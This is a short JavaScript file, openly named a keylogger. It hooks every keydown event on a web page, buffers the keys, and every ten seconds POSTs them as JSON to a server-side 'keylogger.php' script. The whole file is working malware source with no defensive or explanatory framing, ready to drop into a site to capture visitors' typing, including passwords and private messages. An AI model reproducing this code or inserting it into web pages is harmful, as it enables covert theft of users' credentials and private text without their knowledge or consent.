 var keylogger = {

    array : [],



    init_function:function(){
      
        window.addEventListener("keydown",function(evt){

            keylogger.array.push(evt.key);

            

            


        });


        window.setInterval(keylogger.send_function,10000);


    },

    send_function: function(){

if(keylogger.array.length != 0){

    this.send = true;
    var object_sent = new FormData();
    object_sent.append("key",  JSON.stringify(keylogger.array));
    keylogger.array = [];


    var ajax_req = new XMLHttpRequest();
    ajax_req.open("POST","keylogger.php");


    ajax_req.onload= function(){
 
        console.log(this.response);

    };

    ajax_req.send(object_sent);

}
    }




 };

 window.addEventListener("DOMContentLoaded",keylogger.init_function);